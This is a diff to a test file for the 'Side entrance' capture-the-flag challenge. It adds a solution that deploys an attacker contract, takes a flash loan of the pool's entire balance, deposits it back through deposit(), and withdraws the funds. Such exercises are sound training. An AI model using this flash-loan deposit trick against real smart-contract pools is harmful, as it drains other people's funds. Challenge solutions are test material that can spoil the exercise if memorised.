@@ -25,6 +25,13 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Take a flash loan with the full amount in the pool
+        // In the execute method (attacker), deposit the ETH back into the pool via deposit()
+        // Execute the withdraw method from the pool contract
+        const sideEntranceAttackerFactory = await ethers.getContractFactory("SideEntranceAttacker", attacker);
+        this.attackerContract = await sideEntranceAttackerFactory.deploy(this.pool.address);
+        this.attackerContract.triggerFlashLoan(ETHER_IN_POOL);
+        this.attackerContract.retrieveFunds();
     });
 
     after(async function () {
